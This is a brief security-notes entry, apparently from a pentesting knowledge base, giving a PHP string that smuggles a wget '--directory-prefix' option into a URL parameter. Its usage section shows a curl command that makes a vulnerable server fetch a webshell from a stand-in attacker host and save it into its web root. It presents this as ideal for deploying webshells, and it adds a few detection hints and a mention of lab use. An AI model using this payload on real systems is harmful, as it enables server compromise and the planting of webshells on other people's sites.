---
type: code
language: PHP
verified: true
tags:
  - payload
  - injection
  - php
  - wget
platforms:
  - Linux
  - Web
validated: true
---

# Injected-URL-Payload-for-WGET-Directory-Prefix

## Code

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```

## Description

This PHP code snippet sets a variable $url to an injected payload string designed for WGET argument injection. When passed to a vulnerable system('wget ' . $url), it causes wget to interpret '--directory-prefix=/var/www/html' as an option, saving the downloaded file from http://example.com/example.php to /var/www/html on the target server. Replace example.com/example.php with an attacker-controlled malicious file URL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $url | The crafted injection string (URL-encoded when sending via HTTP) | '--directory-prefix=/tmp http://attacker.com/webshell.php' |

## Usage

Use this payload in HTTP requests to vulnerable endpoints, e.g., via curl: curl "target/download?url=--directory-prefix=/var/www/html%20http://attacker.com/shell.php". Ideal for deploying webshells in web app exploitation. Test in labs with vulnerable PHP apps like DVWA.

## Detection

- Request logging: Flag GET/POST params starting with '--' or containing 'directory-prefix'/'output-document'.
- Network monitoring: Correlate wget processes with inbound requests from unknown IPs.
- Anomaly detection: Unexpected file writes to web directories post-download requests.

## Related

- [[procedures/WGET-Argument-Injection]]
- [[commands/curl-send-wget-injection-payload]]
